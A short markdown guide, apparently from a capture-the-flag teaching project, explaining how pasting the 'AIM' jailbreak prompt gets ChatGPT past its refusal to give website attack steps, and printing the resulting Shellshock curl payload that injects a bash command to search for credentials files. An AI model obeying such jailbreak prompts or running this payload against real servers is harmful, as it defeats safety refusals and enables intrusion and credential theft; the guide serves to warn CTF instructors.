# Jailbreak Prompt Bypass

**Introduction**: The Chat GPT's security or morality policy guidelines will stop Chat-GPT gives the solution to attack a website, or scan the vulnerability of a system directly. Such as if you paste the scan result in GPT and ask how to attack the web direct, GPT will not give you the answer :

![](img/rm/q2_4.png)



If the participants doesn't know how to "split" the question to probe and guild the GPT to give the answer, is there any way that he can capture the flag? (obviously ChatGPT has understand want we want, but the OpenAI’s policy guidelines that it’s placed on ChatGPT stop it do so. )

- The answer is **Yes**. they can use the **Jailbreak Prompt Bypass**, in the below section we will introduce the Jailbreak Prompt to bypass the security question.



[TOC]

**Table of Contents**

- [Jailbreak Prompt Bypass](#jailbreak-prompt-bypass)
    + [Cyber Attack Question Bypass](#cyber-attack-question)
    + [Reference](#reference)



------

### Cyber Attack Question Bypass

Jailbreak prompts, as the term suggests, are essentially attempts to bypass certain boundaries or restrictions programmed into the AI. They're cleverly crafted requests that aim to "jailbreak" or free the AI from its pre-defined set of rules. Their purpose extends from simply testing the AI's limits to exploring possibilities that are ordinarily kept out of reach for safety, ethical or legal reasons.

For the cyber attack questions, the answer is Yes. **We don't encourage you do this, but for CTF-D instructor, they may need to know there is one direct way to break their questions.**  What you need is the Jailbreak Prompt for GPT( https://www.jailbreakchat.com/ ) , the The Always Intelligent and Machiavellian chatbot prompt (AIS) can be applied to bypass most of OpenAI’s policy guidelines that it’s placed on ChatGPT for cyber security questions.

So you go to the web, copy the AIM contents: 

![](img/jailbreak/aim.png)

Then in your question, replace Niccolo's question with your question: 

![](img/jailbreak/shellshock.png)



Now it give you the attack cmd directly: 

```
curl -H "Referer: () { :; }; echo; echo; /bin/bash -c 'find / -type f -name credentials.txt'" http://10.32.51.173/cgi-bin/printenv
```



### Reference

- GPT Jailbreak Prompt Introduction link: https://docs.kanaries.net/articles/chatgpt-jailbreak-prompt



------

> last edit by LiuYuancheng (liu_yuan_cheng@hotmail.com) by 16/05/2023 if you have any problem, please send me a message. 